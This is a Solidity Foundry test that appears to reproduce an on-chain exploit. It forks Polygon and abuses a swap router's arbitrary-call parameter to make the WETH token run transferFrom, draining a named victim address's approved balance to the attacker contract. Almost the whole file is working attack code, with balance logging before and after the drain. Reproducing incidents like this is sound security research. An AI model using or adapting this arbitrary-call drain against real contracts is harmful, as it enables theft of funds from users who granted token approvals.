// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console, Test} from "forge-std/Test.sol";
import "../test/interfaces/IERC20.sol";

interface Ifinance {
    enum AmountType {
        None,
        Relative,
        Absolute
    }

    enum PermitType {
        None,
        EIP2612,
        DAI,
        Yearn
    }

    struct Permit {
        PermitType permitType;
        bytes permitCallData;
    }

    struct Input {
        TokenAmount tokenAmount;
        Permit permit;
    }

    struct TokenAmount {
        address token;
        uint256 amount;
        AmountType amountType;
    }

    struct AbsoluteTokenAmount {
        address token;
        uint256 absoluteAmount;
    }

    struct AccountSignature {
        uint256 salt;
        bytes signature;
    }

    struct Fee {
        uint256 share;
        address beneficiary;
    }

    struct ProtocolFeeSignature {
        uint256 deadline;
        bytes signature;
    }

    struct SwapDescription {
        SwapType swapType;
        Fee protocolFee;
        Fee marketplaceFee;
        address account;
        address caller;
        bytes callerCallData;
    }

    enum ActionType {
        None,
        Deposit,
        Withdraw
    }

    enum SwapType {
        None,
        FixedInputs,
        FixedOutputs
    }

    function execute(
        Input calldata input,
        AbsoluteTokenAmount calldata absoluteOutput,
        SwapDescription calldata swapDescription,
        AccountSignature calldata accountSignature,
        ProtocolFeeSignature calldata protocolFeeSignature
    ) external payable returns (
        uint256 inputBalanceChange,
        uint256 actualOutputAmount,
        uint256 protocolFeeAmount,
        uint256 marketplaceFeeAmount
    );
}

contract MulticallTest is Test {
    Ifinance augustus = Ifinance(0x6F19Da51d488926C007B9eBaa5968291a2eC6a63);
    address constant vic = 0x02cEFBdA1c0c66A0c9eE12479D5E344c26334672;
    IERC20 weth = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/polygon", 62484871);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Before] Attacker USDC balance", weth.balanceOf(address(this)), 18);
        attack();
        emit log_named_decimal_uint("[After] Attacker USDC balance", weth.balanceOf(address(this)), 18);
    }

    function attack() internal {
        uint256 allowance = weth.allowance(vic, address(augustus));
        uint256 balance = weth.balanceOf(vic);

        // Log balance and allowance for debugging
        console.log("Allowance:", allowance);
        console.log("Balance:", balance);

        uint256 amountToDrain = balance < allowance ? balance : allowance;


        // Encode transferFrom data
        bytes memory transferData = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)", 
            vic, 
            address(this), 
            amountToDrain
        );

        Ifinance.TokenAmount memory tokenAmount = Ifinance.TokenAmount({
            token: address(weth),
            amount: 0,
            amountType: Ifinance.AmountType.Absolute
        });

        Ifinance.Permit memory permit = Ifinance.Permit({
            permitType: Ifinance.PermitType.EIP2612,
            permitCallData: ""
        });

        Ifinance.Input memory input = Ifinance.Input({
            tokenAmount: tokenAmount,
            permit: permit
        });

        Ifinance.AbsoluteTokenAmount memory absoluteOutput = Ifinance.AbsoluteTokenAmount({
            token: address(0),
            absoluteAmount: 0
        });

        Ifinance.Fee memory protocolFee = Ifinance.Fee({
            share: 80000000,
            beneficiary: address(0)
        });

        Ifinance.Fee memory marketplaceFee = Ifinance.Fee({
            share: 0,
            beneficiary: address(0)
        });

        Ifinance.SwapDescription memory swapDescription = Ifinance.SwapDescription({
            swapType: Ifinance.SwapType.FixedInputs,
            protocolFee: protocolFee,
            marketplaceFee: marketplaceFee,
            account: address(this),
            caller: address(weth),
            callerCallData: transferData
        });

        Ifinance.AccountSignature memory accountSignature = Ifinance.AccountSignature({
            salt: 0,
            signature: ""
        });

        Ifinance.ProtocolFeeSignature memory protocolFeeSignature = Ifinance.ProtocolFeeSignature({
            deadline: block.timestamp + 1 days,
            signature: ""
        });

        // Execute the exploit
        Ifinance(augustus).execute(input, absoluteOutput, swapDescription, accountSignature, protocolFeeSignature);
    }
}
